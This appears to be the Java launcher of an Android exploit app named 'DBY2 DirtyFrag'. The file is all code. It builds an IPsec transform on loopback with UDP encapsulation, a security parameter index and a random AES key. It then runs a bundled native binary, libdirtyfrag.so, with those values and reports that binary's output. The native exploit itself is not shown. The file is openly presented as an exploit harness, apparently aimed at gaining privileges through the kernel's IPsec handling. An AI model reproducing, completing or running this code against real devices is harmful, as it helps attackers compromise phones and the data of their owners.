package dev.dby2.dirtyfrag;

import android.app.Activity;
import android.net.IpSecAlgorithm;
import android.net.IpSecManager;
import android.net.IpSecTransform;
import android.os.Bundle;
import android.util.Log;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.List;

public final class MainActivity extends Activity {
    private static final String LOG_TAG = "DBY2DirtyFrag";
    private static final String NATIVE_BINARY = "libdirtyfrag.so";

    private final List<String> outputLines = new ArrayList<>();
    private TextView outputView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(createOutputView());
        new Thread(this::runExploit, "dirtyfrag-launcher").start();
    }

    private LinearLayout createOutputView() {
        LinearLayout page = new LinearLayout(this);
        page.setOrientation(LinearLayout.VERTICAL);
        page.setPadding(32, 32, 32, 32);

        TextView title = new TextView(this);
        title.setText("DBY2 DirtyFrag");
        title.setTextSize(24);
        page.addView(title);

        TextView output = new TextView(this);
        outputView = output;
        output.setGravity(Gravity.START);
        output.setTextIsSelectable(true);
        output.setTextSize(12);

        ScrollView scroller = new ScrollView(this);
        scroller.addView(output);
        page.addView(scroller, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1.0f));
        return page;
    }

    private void report(String line) {
        Log.i(LOG_TAG, line);
        runOnUiThread(() -> {
            outputLines.add(line);
            outputView.setText(String.join("\n", outputLines));
        });
    }

    private void runExploit() {
        IpSecManager.UdpEncapsulationSocket encapsulationSocket = null;
        IpSecManager.SecurityParameterIndex spi = null;
        IpSecTransform transform = null;
        try {
            IpSecManager ipSecManager =
                    (IpSecManager)getSystemService(IPSEC_SERVICE);
            if (ipSecManager == null) {
                report("IpSecManager unavailable");
                return;
            }

            InetAddress loopback = InetAddress.getByName("127.0.0.1");
            encapsulationSocket = ipSecManager.openUdpEncapsulationSocket();
            spi = ipSecManager.allocateSecurityParameterIndex(loopback);

            byte[] key = new byte[32];
            new SecureRandom().nextBytes(key);

            DatagramSocket senderSocket = new DatagramSocket();
            int senderPort = senderSocket.getLocalPort();
            senderSocket.close();

            transform = new IpSecTransform.Builder(this)
                    .setEncryption(
                            new IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, key))
                    .setIpv4Encapsulation(encapsulationSocket, senderPort)
                    .buildTransportModeTransform(loopback, spi);

            File binary = new File(getApplicationInfo().nativeLibraryDir,
                    NATIVE_BINARY);
            List<String> command = new ArrayList<>();
            command.add(binary.getAbsolutePath());
            command.add("--encap-port");
            command.add(String.valueOf(encapsulationSocket.getPort()));
            command.add("--sender-port");
            command.add(String.valueOf(senderPort));
            command.add("--spi");
            command.add(Integer.toUnsignedString(spi.getSpi()));
            command.add("--aes-key");
            command.add(toHex(key));

            Process process = new ProcessBuilder(command)
                    .redirectErrorStream(true)
                    .start();
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()))) {
                for (String line; (line = reader.readLine()) != null; ) {
                    report(line);
                }
            }
            int exitCode = process.waitFor();
            report("native exit=" + exitCode);
        } catch (Exception error) {
            report("ERROR: " + Log.getStackTraceString(error));
        } finally {
            if (transform != null) {
                transform.close();
            }
            if (spi != null) {
                spi.close();
            }
            if (encapsulationSocket != null) {
                try {
                    encapsulationSocket.close();
                } catch (IOException ignored) {
                    // The native exploit has already finished at this point.
                }
            }
        }
    }

    private static String toHex(byte[] bytes) {
        StringBuilder text = new StringBuilder(bytes.length * 2);
        for (byte value : bytes) {
            text.append(String.format("%02x", value));
        }
        return text.toString();
    }
}
